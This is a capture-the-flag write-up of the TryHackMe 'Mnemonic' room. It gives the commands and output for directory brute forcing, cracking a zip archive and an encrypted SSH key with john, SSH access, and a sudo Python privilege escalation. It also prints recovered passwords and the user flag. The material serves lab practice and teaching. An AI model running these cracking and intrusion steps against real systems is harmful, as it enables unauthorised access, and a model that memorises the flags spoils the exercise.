---
title: "TryHackMe: Mnemonic"
author: mitcheka
categories: [TryHackMe]
tags: [steganography, privilege escalation, OSINT]
render_with_liquid: false
media_subpath: /images/tryhackme-mnemonic/
image:
  path: mnemonic.webp
---
 Mnemonic covered aspects of bruteforcing which gained entry to ftp credentials where a private encrypted key of a user was cracked using john to gain an initial foothold.Further analysis via `OSINT` to use an `image based mnemonic encryption` python script to acquire credentials for another user allowing us to pivot and later escalate our privileges to root.

![card index](mnemonic-card.webp){: width="300" height="300" }

## Initial Enumeration
### Nmap scan

```console
$ nmap -sC -sV -vv -Pn -T4 -p- 10.80.184.33
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.3
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
1337/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Based on the nmap scan there are three open ports;
- **Port 21** `FTP`
- **Port 80** `apache`
- **Port 1337** `SSH`

## Enumeration
The webserver does not have any information we can use but based on the nmap scan I visit the robots.txt endpoint

![robots index](robots-txt.webp){: width="800" height="600" }


Moving forward I do a directory bruteforce on the `/webmasters` endpoint which gives another endpoint `/backups` and `/admin` but I start with `/backups`

```console
$ gobuster dir -u http://10.80.184.33/webmasters -w /usr/share/wordlists/dirb/common.txt             
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.184.33/webmasters
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 323] [--> http://10.80.184.33/webmasters/admin/]
/backups              (Status: 301) [Size: 325] [--> http://10.80.184.33/webmasters/backups/]
/index.html           (Status: 200) [Size: 0]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

I then fuzz the backup page for any file extensions I can get.

```console
$ gobuster dir -u http://10.80.184.33/webmasters/backups -w /usr/share/wordlists/dirb/common.txt -x jpg,txt,png,zip
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.184.33/webmasters/backups
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              png,zip,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```

I download the zip file but tryring to extract its contents it is password protected.I use `zip2john` to crack it and get a password which open exrtracting and opening the `/backup/note.txt` file we get an ftp username `ftpuser`.

```console
$ zip2john backups.zip > crack.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt              
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (?)     
1g 0:00:00:01 DONE (2025-12-30 11:19) 0.7874g/s 11233Kp/s 11233Kc/s 11233KC/s 00793771..00377696192211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
$ unzip backups.zip                                                        
Archive:  backups.zip
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt       

$ cat backups/note.txt
@vill

James new ftp username: ftpuser
we have to work hard
```

Next I use `hydra` to bruteforce ftp which gets us a passsword for the ftp username.

![ftp index](ftp.webp){: width="800" height="600" }

Logging in to ftp and after enumeration the folder `data-4` has interesting information ,an `id_rsa` key and a note which I download to my attackbox.

```console
$ ftp 10.80.184.33
Connected to 10.80.184.33.
220 (vsFTPd 3.0.3)
Name (10.80.184.33:iam): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10100|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
$ ftp> ls
229 Entering Extended Passive Mode (|||10059|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
```

Checking the `id_rsa` key we find out it is encrypted.

```console
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
trq4ik4tpsgHqEU4BDw24bNjtJxgEy4sddtpXyy0i3KZ9gm6Uop6/jFG8uuoAQPn
AcwIZSCpjEfiMLzerVNNotZU9I11jRtbdQsxAjLPYY30PyO2cFlgpohvpyMD6lfO
33v8DOV8U69zlyUtUgArfZ9IORPKLOW5VLfuqX8yLsylVrmmuGdlfN+zO5enukjV
cg/mpJL/kePgViEqnTJf5Y8vYJ9tEGko8YBvorrsS0QXN7GJtW8h7IYrsLpXYzeu
FPD5cgEdixE4UlGo7G6nmlkikLsDwjjVIDX9C3eHljAhiktKAu19wbwdaJ8F4WWW
txZv/fsKBSI/JexzOY2lKSFq52Dod6G1eCVf0WgsQrXBOxgKn/iQ0dg4aCVNttni
kKKW3hEQP3gK6B20dnIItFzQpaqapuNJKnAWEj6YG+7QpCjncMEMUDGpCSqnMuYB
PVM3GU4sq5OO14gXtjOgTfBXP07cqkuW6L8XQl+sWobgVuIGmK69wfCZSjy29Hqo
8SmeUAdiv37UenHGLxwjelnNcblLm/BYyW6P6m6pc+zgUSK/MVysGj9B8ryLVcIc
P8O/HKResEUC/MZJGYWIZeu7UK/Ifs5IN/uTYmBM9/44tRJApvY+3rrdUUA3khjY
ZTzeX1/xS5rqprEYcr19ExboGVqNCUMHPwmufZZbB1uUagaR2Cv44j9rU19BVF1s
czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
j5NOaTeWFwVy55ONPzGgCICsj+izaOuCvsbdJQ7FdQ0LPNzZ/RUFvh4k7E1ZjBos
y9GNQW8WMAWH7SFK91KdX4c+fsAPnHN/v7uF/dRWlzkusrVLznURsVtG0k2BxUwx
PYn3OG7SwGS+DyiFvvV0NspX2oIXEqA6VioqQxc+0dcEGxcyNY5uDut3BENGPD+X
Ut/fe6bIfVse+ovAb6F36SBquuDjJWCHaHyVMASlmmzA6A6XhlSnrxhVP2/cmtdo
zUicXz715Li1enhR6p68AzGhBzYZsF/F9MSbrBgust0zDeNllL/4slZ9zfrg+zUY
weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
-----END RSA PRIVATE KEY-----
```

So now we need to convert this private key to a format that can be cracked using `johntheripper` after which we crack the ssh passphrase which is successful.

```console
$ ssh2john id_rsa > mnemonic.txt 
$ john --wordlist=/usr/share/wordlists/rockyou.txt mnemonic.txt           
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)     
1g 0:00:00:00 DONE (2025-12-30 11:39) 16.66g/s 465600p/s 465600c/s 465600C/s canary..baller15
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now based on information uncovered before I bet it is safe to assume the user is `james`  so I use it log in via ssh on port 1337 which grants us a shell.

![shell index](james-shell.webp){: width="800" height="600" }

But as I am enumerating I discover there is an IDS/IPS SYSTEM which locks us out every two minutes but doesn't block you so I thought I could  escape `restricted rbash shell` but where's the fun in that huh.I stick to working with a timeframe to execute.
```console
Broadcast message from root@mnemonic (somewhere) (Tue Dec 30 08:44:29 2025):  
 
bybye!!!
             
Connection to 10.80.184.33 closed.
```

Looking through the file `6450.txt` contains listed numbers that I am not sure what to do with yet so I save them for later.The `noteforjames.txt` file has a hint of another user `condor` and also that the password is encrypted using an `image-based encryption called mnemonic`.
In an attempt to find the `user.txt` flag I use `find` to do a search on the home folder which reveals base64 encoded data under the user condor.

```console
james@mnemonic:~$ find / -type f -name *.txt
find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
```

Decoding the base64 data we get our first flag `user.txt` and the second reveals a URL.

```console
$ echo 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==' | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
$ echo 'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==' | base64 -d        
THM{a5f82a00e2feee3465249b855be71c01} 
```
Visiting the URL we get an image of Kevin Mitnick.Downloading the image the first thing that comes to mind is `steganography` but then remember the hint we were given about mnemonic image-based encryption.Doing  a little research I stumble across a github repository that has the tools for this task.Going through the repo readme it comes back to me the value of the `6450.txt` file which will be used in the decryption process.

![mnemonic index](mnemonic-py.webp){: width="800" height="600" }

```console
(1) ENCRYPT (2) DECRYPT                                                                                       

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:6450.txt


pasificbell1981
```

## Exploitation
Using the acquired credentials for the user `condor` we log in via ssh on port 1337 and we have a shell.

```console
condor@mnemonic:~$ id
uid=1002(condor) gid=1002(condor) groups=1002(condor)
condor@mnemonic:~$ ls
'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
```

## Post-exploitation
Using `sudo -l`  to list what privileges the user has when running sudo

```console
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
condor@mnemonic:~$ nano /bin/examplecode.py
```
Looking at the `examplecode.py` script we discover the script itself can be used to execute shell commands.

![script index](code-py.webp){: width="800" height="600" }

Running the script using `sudo` we escalate our privilege to `root`.

![root index](root.webp){: width="800" height="600" }

But just before I could wrap this up the flag has more information,we have to hash the message in the curly braces before submitting it as the final flag.
Using cyberchef I finish the last task.

![cyberchef index](cyberchef.webp){: width="800" height="600" }

**And thats it guys**





<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
